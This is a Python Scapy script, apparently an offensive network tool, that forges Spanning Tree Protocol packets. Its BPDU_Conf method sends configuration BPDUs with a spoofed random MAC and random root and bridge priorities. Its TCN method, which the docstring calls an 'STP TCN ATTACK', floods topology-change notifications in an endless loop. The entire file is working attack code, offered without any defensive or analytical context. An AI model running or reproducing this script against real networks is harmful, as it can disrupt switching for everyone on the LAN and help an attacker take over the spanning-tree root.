import random
import sys

from scapy.layers.l2 import STP, Dot3, LLC
from scapy.all import *
from MACCHANGER import MAC_CH

Fake_MAC = MAC_CH().Random_MAC_Generator()

class conf_tcn:
    def __init__(self, i_face):
        self.iface = i_face

    def BPDU_Conf(self):

        self.srcMAC = str(Fake_MAC)  # Random MAC in each iteration
        root_prior = random.randint(1, 65536)  # 2 bytes

        # Brigde Identifier (mac and brigde priority)
        brigde_prior = random.randint(1, 65536)  # 2 bytes

        # dst=Ethernet Multicast address used for spanning tree protocol
        p_ether = Dot3(dst="01:80:c2:00:00:00", src=self.srcMAC)   # 01:80:C2:00:00:00 is the Multicast Address fro STP
        p_llc = LLC()

        # print(p_llc.show())

        p_stp = STP(bpdutype=0x00, bpduflags=0x01, portid=0x8002, rootmac=self.srcMAC,
                    bridgemac=self.srcMAC, rootid=root_prior, bridgeid=brigde_prior)  # Conf packet

        Packet = p_ether / p_llc / p_stp  # STP packet structure

        print(Packet.show())
        sendp(Packet, iface=self.iface, verbose=0, count = 2)


    # BPDU_Conf("eth1")


    def TCN(self):
        """
        This function launch STP TCN ATTACK
        :param inter: interface to be launched the attack
        :type inter: str
        """
        try:
            while True:
                # dst=Ethernet Multicast address used for spanning tree protocol
                srcMAC = self.srcMAC # Random MAC in each iteration
                p_ether = Dot3(dst="01:80:c2:00:00:00", src=srcMAC)
                p_llc = LLC()
                p_stp = STP(bpdutype=0x80)  # TCN packet
                pkt = p_ether / p_llc / p_stp  # STP packet structure

                sendp(pkt, iface=self.iface, verbose=0)

        except KeyboardInterrupt:
            exit()

# conf_tcn("eth1").TCN()
# conf_tcn("eth1").BPDU_Conf()